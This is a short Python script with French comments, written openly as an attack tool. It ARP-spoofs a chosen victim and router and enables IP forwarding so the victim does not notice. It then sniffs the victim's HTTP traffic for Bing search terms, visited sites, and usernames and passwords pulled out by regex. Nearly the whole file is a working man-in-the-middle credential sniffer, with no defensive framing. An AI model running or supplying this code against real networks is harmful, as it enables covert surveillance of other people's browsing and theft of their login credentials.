#!/usr/bin/env python

from scapy.all import *
import threading
import argparse
import os
import sys



def arg_parser():
	parser = argparse.ArgumentParser()
	parser.add_argument("-r", "--routerIP", help="IP du router. Example: -r 192.168.1.1")
	parser.add_argument("-v", "--victimIP", help="IP de la victime. Example: -v 192.168.1.5")
	parser.add_argument("-m", "--monitor", help="Moniteur. Example: wlan0")
	return parser.parse_args()

print 'Attaque en cours...Passez une bonne journee!'
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #la victime doit recevoir le paquet pour loader sa page web sinon il se doutera de quelque chose

def searchBing(pkt):
	try:
		if pkt.haslayer(Raw):
			payload = pkt.getlayer(Raw).load
			if payload.startswith("GET"):
                    			search = payload.split('\n', 1)[0].split('&')[0]
					if 'search?q' in search :
						searchTerm = search.split('search?q=',1)[1]
						searchTerm = searchTerm.replace('+',' ')
						print "Une recherche BING de " + arg_parser().victimIP +  " pour : " + searchTerm
	except:
		print 'error search'

def visitedWebsite(pkt):
	try:
		if pkt.haslayer(Raw):
			payloadWeb = pkt.getlayer(Raw).load
			if payloadWeb.startswith("GET") and 'Referer:' in payloadWeb:
				print "La victime " + arg_parser().victimIP +" a ete sur "  + payloadWeb.split('Referer: ')[1].split('\n',1)[0]
	except:
		print 'error visited'

def Attack(pkt):
	getUsernamePassword(pkt) #utilise si on souhaite d/ecouvrir des noms dusager ou mot de passe
	searchBing(pkt)
	visitedWebsite(pkt)
	

def getUsernamePassword(pkt):
	if pkt.haslayer(Raw):
		payload = pkt.getlayer(Raw).load
		user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
		pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
		username = re.findall(user_regex, payload)
		password = re.findall(pw_regex, payload)
		print username
		print password

def v_poison():
	v = ARP(pdst=arg_parser().victimIP, psrc=arg_parser().routerIP)
	while True:
		try:	
		       send(v,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
			 sys.exit(1)
def gw_poison():
	gw = ARP(pdst=arg_parser().routerIP, psrc=arg_parser().victimIP)
	while True:
		try:
		       send(gw,verbose=0,inter=1,loop=1)
		except KeyboardInterupt:
			sys.exit(1)

vthread = []
gwthread = []	


while True:	# Threads 
		
	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()		
        
	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	gwpoison.start()

	sniff(filter='tcp', iface=arg_parser().monitor, prn=Attack)
